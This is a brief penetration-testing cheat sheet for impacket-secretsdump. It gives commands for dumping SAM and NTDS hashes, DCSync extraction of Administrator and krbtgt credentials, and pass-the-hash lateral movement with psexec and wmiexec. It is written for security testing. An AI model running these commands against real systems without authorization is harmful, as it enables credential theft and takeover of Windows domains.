## Introduction

impacket-secretsdump is a popular tool from the Impacket framework used in Windows/Active Directory security testing. It extracts credential data such as:
##### NTLM password hashes
##### Cached domain credentials
##### LSA secrets
##### SAM database hashes
##### Kerberos keys
##### NTDS.dit data from Domain Controllers


It works remotely over SMB/RPC and usually does not require uploading malware or agents to the target system. Security professionals commonly use it during penetration tests and red team assessments to demonstrate credential exposure and lateral movement risks.
Typical use cases:
##### Dumping local Windows account hashes
##### Performing DCSync attacks against Domain Controllers
##### Extracting credentials for privilege escalation testing
##### Offline analysis of SAM/NTDS files

Example syntax:

### Dump local hashes
```
impacket-secretsdump administrator:'admin@1234'@172.16.220.83
```

#### AD SET - GOT DOMAIN ADMIN:-
##### Step 1: Dump everything from DC
```
impacket-secretsdump domain.local/domainadmin:'password'@DC_IP
```

##### Step 2: Dump specific high-value users
```
impacket-secretsdump -just-dc-user Administrator domain.local/domainadmin:'password'@DC_IP
impacket-secretsdump -just-dc-user krbtgt domain.local/domainadmin:'password'@DC_IP
```

##### Step 3: PTH to all machines with admin hash
```
impacket-psexec administrator@MACHINE2_IP -hashes :NTLM_HASH
impacket-wmiexec administrator@MACHINE3_IP -hashes :NTLM_HASH
```

#####  GOT SAM/SYSTEM FILES
```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

#####  GOT NTDS.DIT + SYSTEM 
```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```